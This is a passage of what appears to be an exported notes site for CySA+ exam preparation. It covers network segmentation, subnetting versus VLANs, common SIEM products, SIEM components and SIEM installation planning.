you must configure network devices such as gateways, routers, and firewalls. These devices route traffic between segments and enforce security policies.\n\n\nWhen configuring network devices, you must set up firewall rules and access controls to suit the security needs of each segment. This will filter traffic, block harmful activity and limit access.\n\n\nSetting Access Controls and Security Policies\n\nYou must set the access controls and security policies correctly for each segment. These include measures such as authentication, authorization, encryption, secure login and data traffic monitoring.\nYou must implement appropriate security policies and access controls to limit access between segments. You must ensure that users and devices can access only the required segments.\n\nAt this point, the most important thing that we always remember is that segmentation is actually a living process and therefore it needs to be checked and improved constantly just like other security processes. In order to achieve this, it is very important that you should periodicize the work that we have summarized in the following five items:\nMonitoring Traffic\nMonitoring traffic between segments is one of the most effective ways to determine if network segmentation is working correctly. Analyze data traffic between segments using network monitoring tools. If you are not seeing intersegment traffic, you can say that segmentation is active.\nFirewall Tests\nPerform firewall tests to verify that the firewalls that limit access between segments are configured correctly. These tests simulate access attempts from one particular segment to another and check whether there is an unexpected transition.\nAccess Control Tests\nTo assess access controls between segments, examine the capacity of users and devices’ ability to switch between segments. You can say that the segmentation failed if an unauthorized user or device gains access to another segment.\nSensitive Data Tests\nIt is important to test data security in segments that have sensitive data. Try to access sensitive data located between segments and check if these attempts are blocked. If you gain unauthorized access to sensitive data, you can say that segmentation is not secure.\nPenetration Tests\nPerform penetration tests to identify weak spots between segments. These tests simulate an attacker’s attempts to attack between segments. If an undesired transition between segments occurs, it may be an indication that the segmentation is not working properly.\nThese tests will help you determine if network segmentation is working properly. You should regularly run tests to monitor the effectiveness of segmentation and make improvements as needed. In addition, it is important to follow up-to-date safety standards."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Segmentation":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Segmentation","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Segmentation.md","title":"Segmentation","links":["SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Based-Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Application-Based-Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Subnetting"],"tags":[],"content":"Segmentation plays a crucial role in establishing a dependable network configuration. Segmentation helps ensure security and brings a range of advantages. It helps networks more and better manageable. For instance, if a network with 100 endpoints and excessive traffic gets segmented properly it will be easier to manage the network both from the traffic and the security aspect. Security vulnerabilities in one endpoint can have cascading negative effects on others but we can easily avoid these security risks by properly segmenting these endpoints. Segmentation will also help managing the network and it will provide us better and easier management structure. Various segmentation methods are available as you can see below:\n\nNetwork-Based Segmentation\nApplication-Based Segmentation\nSubnetting\n"},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Subnetting":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Subnetting","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Subnetting.md","title":"Subnetting","links":[],"tags":[],"content":"IP subnetting is a networking technique used to divide a larger IP address space into smaller, more manageable sub-networks or subnets. It is commonly used in IP (Internet Protocol) networks, both in local area networks (LANs) and wide area networks (WANs), to efficiently allocate and manage IP addresses.\nSubnetting involves dividing an IP address into two parts: the network portion and the host portion. This division is typically represented using a subnet mask, which consists of a series of binary 1s followed by a series of binary 0s. The 1s in the subnet mask indicate the network portion, while the 0s indicate the host portion.\nLet’s segment the network that we segmented with VLAN in the previous issues, this time with Subnetting. As you can see in the image below, the “Devops” server is running on the “192.168.1.0” network and with the “255.255.255.0” subnet mask. The “Finance” server runs on the “192.168.2.0” network and with the “255.255.255.0” subnet. In this case, we can provide an IP address to the network cards of the users (in our example, the developers) that we want to access the “Devops” server, from the network “192.168.1.0/255.255.255.0”, so that they can access this server.\nWith the same way, we can assign IP addresses to the network cards of “Accounting” users and “CFO” systems from the “192.168.2.0/255.255.255.0” network so that they can only access the “Finance” server.\n\nWell, if we can do the same thing like IP Subnetting without needing any special equipment, what is the use of VLANs?\nIP subnetting and VLANs are not alternatives to each other, they are two different approaches used to segment networks. Both meet certain requirements and in some cases are complementary to each other. However, some features of VLANs make them preferable over IP subnetting in certain situations. Let’s summarize these reasons simply:\nFlexibility\nVLANs provide a model whose network segmentation is not based on physical location. A VLAN can contain devices anywhere in the same physical network. For example, you can separate devices on the same floor of a company into different VLANs or combine devices on different floors in the same VLAN. This is flexibility that IP subnetting often cannot offer.\nPerformance and Efficiency\nVLANs limit broadcast traffic because each VLAN creates a separate broadcast domain. This can improve the overall performance and efficiency of the network.\nSecurity\nVLANs make it easy to isolate certain groups or applications from others. This can be an important tool for limiting access to certain network resources or data. IP subnetting can also improve security, but VLANs often offer more flexibility in this regard.\nNetwork Management\nVLANs provide network administrators with the ability to more effectively manage network traffic and resources. VLANs allow certain parts of the network to be reconfigured as needed, which facilitates network changes as needed."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/index":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/index","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/index.md","title":"index","links":["SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Topology-Design","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Based-Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/How-to-Implement-Network-Based-Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Application-Based-Segmentation","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Subnetting","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Firewalls-and-Types","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-(IDS,-IPS,-WAF,-and-NAC)","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-2"],"tags":[],"content":"1. Network Topology Design\n2. Segmentation\n3. Network-Based Segmentation\n4. How to Implement Network-Based Segmentation\n5. Application-Based Segmentation\n6. Subnetting\n7. Firewalls and Types\n8. Network Security Products (IDS, IPS, WAF, and NAC)\n9. Network Security Products-2"},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Common-SIEM-Products":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Common-SIEM-Products","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/Common SIEM Products.md","title":"Common SIEM Products","links":[],"tags":[],"content":"The SIEM (Security Information and Event Management) market has a wide range of products offered by many different manufacturers. These products typically offer basic SIEM functions such as log collection, analysis, correlation, and threat detection. However, each stands out with its own unique features. Here are some commonly used SIEM products and features:\n\n(Image Source: www.cyberkach.com/blog/siem-ii )\nSplunk\nSplunk is one of the industry’s leading SIEM solutions. Splunk has extensive capabilities in big data analytics and real-time business intelligence and is used by many organizations for log management, monitoring, and security analysis.\nGeneral features:\n\n\nData Collection : Ability to collect log and machine data from different sources (servers, network devices, applications, etc.).\n\n\nReal-Time Analysis : Analyzing and visualizing logs and other data in real-time.\n\n\nScalability : Splunk is scalable across a wide spectrum, from small businesses to large organizations.\n\n\nVisualization and Dashboards : Visualize data with customizable dashboards, charts, and reports.\n\n\nResearch and Query : Ability to make detailed queries on data with powerful search functions.\n\n\nApplications and Integrations : Leveraging various data sources and technological solutions through pre-configured applications and integrations.\n\n\nHighlighted Features:\n\n\nSplunk Cloud : As a cloud-based SIEM solution, this version of Splunk offers the advantage of rapid deployment and scaling.\n\n\nSplunk IT Service Intelligence (ITSI) : It is a product developed to monitor and analyze the performance of IT and business services.\n\n\nAdvanced Threat Analysis : Advanced threat detection and response with AI and machine learning-based analysis.\n\n\nThreat Hunting : Provides tools for proactive security analysis and threat hunting.\n\n\nAdvanced Correlation : Improved event correlation between different data sources.\n\n\nSplunkbase : A marketplace with thousands of pre-made applications and plugins for Splunk. This makes Splunk easier to integrate into a variety of technologies and use cases.\n\n\nBroad API Support : Splunk’s APIs make it possible to create customized solutions by integrating with third-party applications.\n\n\nSplunk goes beyond being just a security solution with its general data analysis and business intelligence features. However, fully evaluating these features requires proper configuration and optimization. Organizations must receive the necessary training and/or work with experienced experts to use Splunk effectively.\nIBM QRadar\nIBM QRadar is one of the industry’s leading SIEM (Security Information and Event Management) products. Below you can find the general and prominent features of QRadar.\nGeneral features:\n\n\nLog Management : Collects, normalizes, stores, and analyzes logs from different sources.\n\n\nEvent Correlation : Identifies complex security threats by correlating data from various log and event sources.\n\n\nNetwork Flow Analysis : Detects potential threats and performs asset discovery by analyzing network traffic.\n\n\nOffense Management : Used to identify, prioritize, and track security breaches and other critical events.\n\n\nVisualization : Customizable dashboards, charts, and reporting features.\n\n\nScalability : Provides a scalable structure for large-scale corporate networks.\n\n\nHighlighted Features:\n\n\nQRadar QFlow : Deeply analyzes network traffic, collects content data, and displays application activity.\n\n\nQRadar VFlow : Captures and analyzes virtual network traffic.\n\n\nAdvanced Threat Intelligence: Provides up-to-date threat intelligence and information about well-known malicious IP addresses through integration with IBM X-Force.\n\n\nHigh Customizability : Allows organizations to create customized correlation rules based on their use cases.\n\n\nAutomatic Incident Responses : The ability to automatically respond to specific security incidents.\n\n\nAdvanced Search and Query : A user-friendly search interface to quickly research events and streams.\n\n\nDetection of Anomalies : Detects abnormal behavior in the network with AI and machine learning-based analysis.\n\n\nQRadar offers a comprehensive SIEM solution for many different industries and sizes of businesses. However, proper configuration, constant updates, and training are required to use this system effectively.\nLogRhythm\nLogRhythm is also a well-known industry leader in the field of SIEM market. LogRhythm is designed to provide advanced protection against modern threats.\nGeneral features:\n\n\nIntegrated Log Management : Ability to collect, normalize, classify, and analyze logs from various systems and platforms.\n\n\nAdvanced Event Correlation : The ability to create complex correlations between different data sources.\n\n\nAI-Based Threat Detection : Using artificial intelligence and machine learning to automatically identify anomalies and suspicious behavior.\n\n\nAlert and Incident Management : Ability to respond quickly and manage security incidents effectively.\n\n\nVisualization and Dashboards : Customizable dashboards and charts to quickly gain insight into security status.\n\n\nAutomation and Orchestration : The ability to automate security operations and coordinate between different security products.\n\n\nHighlighted Features:\n\n\nNetwork Monitor : Provides rich content for threat hunting and internal threat detection by examining network traffic in depth.\n\n\nCloudAI : Uses artificial intelligence to identify abnormal behavior by analyzing user and asset behavior.\n\n\nSmartResponse : The ability to create automation actions to react to specific threat scenarios automatically.\n\n\nCase Management : The ability to organize and document processes for responding to security incidents.\n\n\nFile Integrity Monitoring : Monitoring and alerting on important file and configuration changes.\n\n\nMulti-tenancy Support : Particularly useful for environments that support multiple customers or business units.\n\n\nForensic Analytics : Detailed analysis to detect malicious activities by looking deeper into events.\n\n\nLogRhythm offers a comprehensive and customizable SIEM solution for mid to large-sized organizations. However, using this system with maximum efficiency requires proper configuration, constant updates, and training.\nArcSight (Micro Focus)\nArcSight is another leading SIEM solution provided by Micro Focus and is considered the industry standard. ArcSight is used to detect, analyze, and respond to security incidents and data breaches.\nGeneral features:\n\n\nLog Management : Collects, normalizes, indexes, and analyzes logs from various devices and applications.\n\n\nAdvanced Event Correlation : Detects advanced threats and security incidents by correlating events across different data sources.\n\n\nReal-Time Monitoring : Monitors real-time data sources such as network traffic, application activity, and user behavior.\n\n\nWarning and Alarm Mechanism : Creates automatic alerts for events that meet certain conditions.\n\n\nVisualization and Reporting : Customizable dashboards and reports to assess and analyze security status.\n\n\nData Storage and Querying : Stores large amounts of data for a long time and investigates events with fast query capabilities.\n\n\nHighlighted Features:\n\n\nEffective Correlation Engine : The ability to detect complex threats and events with a powerful and customizable correlation engine.\n\n\nDistributed Event Collection : The ability to collect events from distributed systems in various geographic locations.\n\n\nArcSight Data Platform (ADP) : Provides data collection, enrichment, and normalization functions.\n\n\nArcSight Investigate : High-speed incident investigation and threat-hunting capabilities.\n\n\nIntegration : Easy integration with various security tools and solutions.\n\n\nFlexible Architecture : Thanks to its scalable structure, it can be used in both small businesses and large corporate networks.\n\n\nMachine Learning and Artificial Intelligence : AI and ML-based analysis to detect anomalies and suspicious behavior.\n\n\nArcSight is particularly popular for large-scale organizations and has a large community and support infrastructure. However, to use this system at its best, proper configuration, constant updates, and training are required.\nMicrosoft Sentinel\nMicrosoft Sentinel is Microsoft’s cloud-based SIEM (Security Information and Event Management) and SOAR (Security Orchestration, Automation, and Response) solution. It runs on the Azure platform and is used to detect, analyze, and respond to security incidents and data breaches of organizations.\nGeneral features:\n\n\nCloud-Based Structure : Sentinel runs on the Azure cloud, providing scalability and maintenance benefits.\n\n\nLog Management : The ability to collect and store logs from various devices, applications, and services.\n\n\nAdvanced Event Correlation : Detects complex threats and security incidents by correlating events across different data sources.\n\n\nReal-Time Monitoring : The ability to monitor security events in real time.\n\n\nIntegration : Deep integration with other Azure services and Microsoft’s security product line.\n\n\nSOAR Features : Provides security automation, response, and orchestration capabilities.\n\n\nHighlighted Features:\n\n\nComprehensive Visualization Interface : Ability to visualize events and threats with powerful and customizable dashboards.\n\n\nAI-Powered Analysis : Smarter threat hunting and incident detection by leveraging Azure’s AI capabilities.\n\n\nCode-Free Query : With its easy-to-use query interface, users can perform in-depth analysis without code knowledge.\n\n\nPlaybook Automation : The ability to create automated playbooks to create automatic responses to specific events.\n\n\nIntegration : Easy integration with other security products from Microsoft (i.e. Microsoft Defender) and third-party solutions.\n\n\nLow Cost : With its cloud-based structure, organizations can pay according to their scale.\n\n\nWorldwide Data Centers : Leveraging Microsoft’s extensive data center network to meet data storage needs in different geographic regions.\n\n\nMicrosoft Sentinel is a very appealing choice, especially for organizations that have existing integrations with Azure and use other products of the Microsoft ecosystem. Its cloud-based structure offers great flexibility in scaling and expansion, unlike traditional SIEM solutions.\nConclusion/Summary\nEach of these products has unique features that may be suitable for different use cases, organizational requirements, and budgets. When deciding which SIEM product is the  best fit, it is important to consider factors such as the needs of the organization, scalability requirements, cost, and support options.\nIn this part of the training, we have covered commonly used SIEM products and their features. We wil"},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Introduction-to-SIEM":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Introduction-to-SIEM","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/Introduction to SIEM.md","title":"Introduction to SIEM","links":[],"tags":[],"content":"Security Information and Event Management (SIEM), is a solution that enables companies and organizations to collect, store, analyze, and generate reports from security events and data logs.\nThe main purpose of SIEM is to centralize and analyze large amounts of log and event information from organizations’ IT infrastructures and to detect and manage security threats using this data. Under this broad purpose, SIEM has several specific goals:\nCentral Surveillance\nModern IT infrastructures are often dispersed and contain numerous components: servers, endpoints, network devices, applications, and more. SIEM tools collect logs and events from these components in a central point, which allows security experts to monitor the entire infrastructure from a single location.\nThreat Detection\nSIEM systems quickly detect abnormal or suspicious activities using correlation rules and advanced analysis techniques. This is especially critical for detecting unknown and complex attacks, such as zero-day threats.\nCompliance Reporting\nMany industries require organizations to comply with certain security standards (e.g. PCI DSS, HIPAA). SIEM tools store the logs required for compliance with these standards and creates compliance reports.\nForensic Analysis and Incident Response\nAfter security incidents occur, SIEM tools store detailed log information for forensic analysis. This information is critical to understanding how an attack occurred and what its impact was.\nAutomation and Integration\nSIEM can integrate with other security tools to respond to security incidents automatically. For example, it can trigger a firewall rules automatically when suspicious traffic is detected.\nUser and Asset Tracking\nSIEM tools detect abnormal behaviors by creating behavioral profiles of users and IT assets. This is especially important for detecting insider threats.\nOperational Efficiency\nSIEM tools can improve overall operational efficiency by providing valuable insights for IT operations. For example, it can detect system errors, performance issues, and configuration errors.\nTo summarize, the main purpose of SIEM is to enable organizations to respond to security threats quickly and effectively, monitor their IT infrastructures continuously, and meet the compliance requirements. This helps organizations both protect their digital assets and maintain customer trust.\nIn this part of the training, we have covered the introduction to SIEM tools, its use and purposes. In the next part of the training, we will be learning about the subject of “ SIEM Components ” topic."},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Components":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Components","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/SIEM Components.md","title":"SIEM Components","links":[],"tags":[],"content":"Security Information and Event Management (SIEM) systems are complex solutions that include many components and features. These components enable the SIEM to collect data from different sources, analyze this data, and eventually detect and react to security threats. The basic SIEM components can be grouped under the following headings:\n\n(Image Source: www.wallarm.com/what/siem-whats-security-information-and-event-management-technology-part-1 )\nData collection\nIt enables SIEM to collect log and event information from devices, servers, and other systems on the network. Collection methods can be agent-based (via device-specific software) or non-agent (directly from the device’s log outputs). This collected data helps the SIEM process centrally for analysis. In summary, data collection is the process of obtaining log and event data from various devices, servers, applications, and other sources on the network.\nTo ensure visibility, SIEM needs this data to monitor activities within and around the network. This is crucial for detecting, analyzing, and responding to potential threats. Furthermore, the SIEM correlation engine analyzes data from various sources and searches markers for potential security events. \nBriefly, the most basic data sources are:\nNetwork Devices: Network devices such as routers, switches, firewalls, and IDS/IPS systems.\nServers: Logs of different operating systems.\nApplications: Databases, web servers, email servers, and other enterprise applications.\nOther Resources: Cloud services, IoT devices, authentication systems and more.\nLog collection methods:\nAgent-Based Collection: Agents designed specifically for SIEM are installed on source systems and send logs directly to the SIEM system.\nAgentless Collection: Collecting logs through central log servers or syslog servers without using an agent.\nAPI and Integrations: Integration via APIs to retrieve data from modern platforms such as cloud services.\nIn short, data collection process is critical for SIEM to work effectively. This process ensures that the organization can comprehensively monitor its entire network and react quickly to potential threats. Therefore, choosing the right data collection strategies and tools is essential.\nLog and Data Storage\nAnother important component of SIEM systems is log and data storage capacity. This helps the SIEM systems meet compliance requirements besides its capabilities to monitor, analyze, and report events. SIEM systems collect logs and event data from network devices, servers, applications, and other sources. This data is stored for extended periods of time for analysis, research, reporting, and compliance purposes.\nExamining past incidents is critical for threat hunting and can help identify trends in security incidents. In many industries, logs must be retained for a certain period of time. For example, regulations such as PCI DSS may require to retain certain logs for a year or longer. When security breaches or other incidents occur, access to old logs is critical to understanding what happened.\nAs a result, the log and data storage capacity of the SIEM system allows a historical review of events, meeting compliance requirements and better understanding of potential security threats. Therefore, it is essential to properly design and manage the storage strategy and infrastructure.\nLog Normalization\nLog normalization is the process of converting event and log data from different systems, devices, and applications into a standard format or structure.\nDifferent sources use different log formats and structures. These differences make it difficult to consolidate, analyze, and correlate events. Normalization addresses these challenges by standardizing this data, making it an essential issue in SIEM projects.\nAs a working structure, SIEM systems collect log and event data and apply predefined transformation rules to this data. These rules know what formats log and event data come in and define what to do to convert them to a certain standard. As a result, events from different sources are represented in SIEM in the same format.\nCorrelation is extremely important in terms of query, search, report, and performance. In conclusion, event normalization is a fundamental process that ensures SIEM systems operate effectively. By converting data from different sources into a standard format, it facilitates the analysis, correlation, and reporting of this data.\n\n(Image Source: www.logpoint.com/en/what-is-siem/ )\nLog Correlation\nOne of the key features of SIEM systems is log correlation. Log correlation helps detect a specific pattern or event by analyzing log information from different sources. Log correlation is the process of analyzing log entries from different systems, applications, and devices and combining them to detect a specific event, security breach, or other potential threat. Correlation is usually performed automatically, based on predefined rules or algorithms.\nFeatures and Functions of Log Correlation:\nMulti-Source Log Processing: Correlation is often used to analyze logs from multiple sources. This is critical for detecting correlated events between different systems.\nPredefined Rules: SIEM systems can use predefined correlation rules to detect specific threat scenarios or security events.\nAutomatic Alerts and Notifications: Correlation can automatically generate alerts or notifications when a specific pattern or event is detected.\nAdvanced Diagnostics: Through correlation, security professionals can better understand the cause and effect of events.\nHistorical and Real-Time Analysis: Correlation can operate on both real-time and historical log data, allowing it to analyze past events and detect what is happening right now.\nImportance of Log Correlation:\nComprehensive Visibility: Provides an overview of events in an organization’s IT infrastructure by combining logs from different systems and sources.\nRapid Threat Detection: Correlation quickly identifies specific threat patterns, allowing security teams to respond faster to potential security incidents.\nEffectiveness and Efficiency: Automatic correlation allows security teams to save time by automatically detecting threats instead of manually reviewing logs.\nFewer False Alarms (F/P): Proper correlation rules can reduce the number of false positives so teams can focus only on real threats.\nForensic Analysis: Identifying the chronological order of events and associated events is critical to understand the root cause and impact of a security incident.\nIn short, log correlation is a critical component of modern SIEM systems. This feature is essential to quickly detect, understand, and respond to security incidents and threats. Correlation gives security teams broader and deeper visibility so they can make more informed and effective decisions.\nReal-Time Monitoring and Analysis\nReal-time monitoring is the process of keeping an organization’s network, applications, users, and other components under constant and immediate surveillance. Real-time analysis refers to the automatic evaluation of the data collected during this monitoring against certain security rules, algorithms, and other parameters.\nThe SIEM system collects logs and events from sources (servers, network devices, security solutions, etc.). This data is processed, normalized, and stored by the SIEM tools in real-time. SIEM tools detect threats by applying predefined rules, correlations, and algorithms to this data.\nReal-Time Monitoring and Analysis is critically important because time is critical for detecting and responding to security breaches and other critical incidents. We are able to detects threats almost instantly thanks to real-time monitoring and analysis reducing response time. It monitors every single asset in the organization, ensuring threats are detected when they occur anywhere.\nWarning and Alarm\nAlerts and alarms are automatic notifications that indicate a specific security event or a certain threshold has been exceeded. SIEM systems create these notifications according to specified criteria. This component instantly detects potential security breaches, allowing the organization to respond quickly to the incident. Manually reviewing all logs and events is a challenging task. Automatic alarms automate this process allowing you to focus on only important events and keep track of important events on a regular basis.\nWarning and Alarm Types:\nPredefined Alerts: Alerts created in response to known threats or specific activities. (i.e. too many failed login attempts)\nCustomized Alerts: Alerts created based on the organization’s specific needs and related to a specific workload, application, or process.\nAlert Creation Process:\nData Collection: Transferring relevant data to the SIEM system.\nData Analysis: Analyzing the collected data and checking whether it meets certain criteria.\nCorrelation: Combining and analyzing data from different sources.\nAlert Creation: Automatic creation of an alert if a certain criterion is met.\nAlert Management :\nPrioritization: Not all alarms are of equal importance. Prioritization of alarms according to importance and urgency.\nVerification: Checking whether the alarm represents a real threat and filtering false alarms.\nResponse: Responding quickly and effectively to the event/incident.\nIn short, the alert and alarm mechanism of SIEM systems allows organizations to quickly detect potential threats and breaches and respond to them accordingly. Therefore, it is essential that this mechanism works effectively and is constantly updated.\nReporting \nSIEM reporting involves analyzing and compiling collected log and event data and presenting it in specific formats. These reports present complex data in an understandable format, often through graphs, tables, and text.\nReporting Types:\nSecurity Reports: Contains information on security incidents, threat detections, and other security-related issues.\nCompliance Reports: Reports on whether organizations comply with certain regulatory standards and regulations.\nOperational Reports: Contains information about system performance, user activities, and other IT operations.\nImportance of Reporting:\nBriefing: Obtaining information about the organization’s overall security posture and becoming aware of potential vulnerabilities.\nCompliance: Ensuring and monitoring compliance with various regulatory standards and regulations.\nDecision Making: Making effective decisions about shaping security strategies and IT investments.\nIncident Response: Responding more effectively to similar incidents quicker by obtaining information about past events.\nSIEM reporting capability helps organizations understand their security posture, operational status, and compliance status. These reports play a critical role in both daily operations and strategic planning processes. An effective SIEM reporting process enables organizations to better manage security-related risks, ensure compliance, and generally make more informed and proactive IT and security decisions.\nForensic Analysis\nSIEM systems are valuable not only for real-time event monitoring and threat detection but also for forensic analysis which refers to a detailed examination of the aftermath of a security incident. This investigation aims to determine how and why the incident occurred, who carried it out, and what impact it had.\nIn terms of the importance of SIEM in forensic analysis, it is critical to quickly determine what happened in the immediate aftermath of a security breach. SIEM provides quick access to this information and collects data from multiple sources, which helps forensic analysts get a complete picture of the incident. Chronological event tracking and correlation features help analysts determine how and why events occur. Forensic analysis also includes the collection and preservation of evidence. SIEM ensures that this evidence is verified and preserved.\nTo summarize, SIEM systems are a critical tool for forensic analysis. Following a security incident, the data collection, storage, and analysis capabilities provided by SIEM help organizations quickly determine what happened, plan how to respond to the incident, and understand how to prevent similar incidents in the future.\nUser and Asset Tracking (UEBA)\nUEBA learns the normal behavior of users and assets (servers, devices, applications, etc.) on the network and is used to detect deviations from this behavior. UEBA creates a profile of “normal” behavior by analyzing the historical activities of a particular user or entity. If a user or entity displays activity that does not fit the normal behavior profile, this is considered an anomaly, and such activity can be processed as an alarm or warning.\nImportance of UEBA:\nMore In-Depth Threat Intelligence: UEBA adds an additional layer to traditional signature-based threat detection, meaning more in-depth and accurate threat intelligence.\nFast Response Times: UEBA’s continuous monitoring and automatic detection capability allows security teams to respond faster to potential threats.\nProactive Security Approach: Behavioral analysis can help take a proactive security approach by detecting potential security incidents at an earlier stage.\nComprehensive Internal Threat Protection: Internal threats are often more difficult to detect than external threats. UEBA is an effective tool for identifying such threats.\nIn short, the UEBA capabilities of SIEM systems play a critical role in protecting against modern security threats. This helps organizations take a more effective and proactive security approach against both internal and external threats."},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning--2":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning--2","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/SIEM Installation Planning -2.md","title":"SIEM Installation Planning -2","links":[],"tags":[],"content":""},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/SIEM Installation Planning.md","title":"SIEM Installation Planning","links":[],"tags":[],"content":"SIEM (Security Information and Event Management) installation is a critical step to meet the organization’s information security requirements. This process requires good planning and careful preparation. Here are the steps to adhere to and factors to take into consideration when preparing for SIEM installation:\nNeeds Analysis\nNeeds analysis for SIEM deployment is often the first and most critical step in determining exactly what an organization needs and expects from a SIEM solution. Needs analysis helps in defining the requirements and selecting the most appropriate SIEM solution.\nEvaluation of the Current Situation:\n\n\nAvailable Security Tools : List the security tools you use (Antivirus, IDS/IPS, Firewall, DLP, Proxy, WAF, EDR/EPP, etc.).\n\n\nLog Sources : Which devices, applications, and systems create logs? Determine the formats of these logs (e.g. Syslog, CEF, Windows Event Logs, JSON).\n\n\nAvailable Capacity : Review your current storage, computing, and network capacity. This will help you understand the need to scale the SIEM solution.\n\n\nDetermining Security and Compliance Requirements:\n\n\nDetermine what regulations and standards you must comply with (e.g. GDPR, HIPAA, PCI DSS).\n\n\nDetermine your organization’s specific security policies and requirements.\n\n\nDefining Functional Requirements:\n\n\nLog Storage : How much data should you store and for how long?\n\n\nReal-Time Monitoring : Do you need to monitor security events in real time?\n\n\nEvent Correlation : Do you need to correlate logs from different sources automatically?\n\n\nAlerts and Alarms : Determine the types of events you want to be notified about.\n\n\nReporting : Make a list of what types of reports you need (i.e. compliance reports, daily activity reports).\n\n\nDetermination of Technical Requirements:\n\n\nMake sure which protocols and formats are supported, especially for large and complex IT infrastructures.\n\n\nEvaluate the SIEM solution’s ability to integrate with other security tools.\n\n\nUser and Roles:\n\n\nDetermine who will use the SIEM solution. For example,is it just the security team who will use the system or the whole IT department?\n\n\nDefine the users’ permissions levels.\n\n\nScalability and Future Needs :\n\n\nConsider how the scalability of the SIEM solution will adapt to your organization’s growth or changes in technology infrastructure.\n\n\nConsider These During Needs Analysis :\n\n\nInvolve All Stakeholders : Get input from the IT department, security team, management, and other interested parties.\n\n\nBe Realistic : A SIEM solution with all the features and capabilities may be appealing, but focus on the features you really need.\n\n\nConsider Cost : Try to find the most cost-effective solution for your needs. This should include not only the licensing cost but training, management, customer support, and the maintenance costs as well.\n\n\nNeeds analysis is a critical step for a successful SIEM deployment.\nBudget and Resource Planning\n“Budget and resource planning” is crucial for the success of the project when preparing for a SIEM installation. Making accurate cost estimates during this planning process is important to prevent unexpected costs and keep the project within budget.\nCalculating Total Cost of Ownership (TCO):\n\n\nLicense Costs : Determine one-time, annual, or per-user licensing costs.\n\n\nInfrastructure Costs : If you prefer an on-premise solution, consider hardware, storage, and network costs.\n\n\nMaintenance and Update Costs : Calculate regular maintenance, update, or license renewal costs.\n\n\nTraining Costs : Consider the training costs required for your staff to effectively use the SIEM solution.\n\n\nDetermination of Operational Expenses:\n\n\nStaff : Calculate the work hours, and training requirements for staff who will manage and monitor the SIEM solution.\n\n\nThird-Party Support and Consultancy : If you plan to outsource services, consider the costs required for these services.\n\n\nEstimating Implementation and Integration Costs:\n\n\nInitially, determine which systems, applications, and devices will be integrated into the SIEM solution. Calculate any custom application development or adapter costs that may be required for these integrations.\n\n\nConsidering Future Scaling and Expansion Costs:\n\n\nEstimate additional costs that you may need to spend as your organization grows or its technological infrastructure changes.\n\n\nBackup and Disaster Recovery Planning:\n\n\nConsider the costs of backing up and recovering SIEM data in the event of a disaster.\n\n\nCreating Budget Flexibility:\n\n\nLeave some flexibility in your budget for unexpected situations or costs. This will create a buffer to cover any unexpected costs that may be encountered on the project.\n\n\nResource Planning:\n\n\nPersonnel Allocation : Identify the necessary roles for a successful SIEM project and the people (i.e. project manager, security analyst, system administrator) who will hold these positions.\n\n\nTraining Requirements : Identify the necessary training for your staff to effectively use the SIEM solution and schedule that training.\n\n\nTime Frame : Determine the total time required for SIEM installation, configuration, testing, and full integration.\n\n\nTechnical Resources: Determine the necessary hardware, software, and network resources.\n\n\nGiven that numerous SIEM solutions use EPS (Events Per Second) for licensing and resource allocation, and you can estimate your EPS by using the sites you find by searching for “Online EPS Calculator” in search engines.\nPlanning a SIEM deployment can be a complex process, especially for large and complex IT infrastructures. Therefore, it is important to plan all the steps carefully and stick to this plan at every stage of the project.\nCompatibility and Integration\nCompatibility and integration in SIEM deployment planning are critical to ensure the new SIEM solution works properly with the organization’s current infrastructure. Here are the steps you need to consider when planning for compatibility and integration:\nCompliance Planning\nEvaluation of Current Infrastructure:\n\n\nDetermine your current IT infrastructure (operating systems, databases, applications, network devices, etc.) in detail.\n\n\nCreate a comprehensive inventory to list current hardware and software versions.\n\n\nChecking the Platforms and Versions Supported by the SIEM Solution:\n\n\nCheck the SIEM product’s documentation or technical features to learn about supported operating systems, applications, and devices.\n\n\nMatching Requirements:\n\n\nMake a mapping of your current infrastructure and the platforms supported by the SIEM solution.\n\n\nThis will help you identify possible incompatibilities in advance.\n\n\nChecking Compatibility in the Test Environment:\n\n\nBefore installing the SIEM solution directly in the production environment, check compatibility by installing it in a test environment.\n\n\nIn this way, you can detect possible problems in 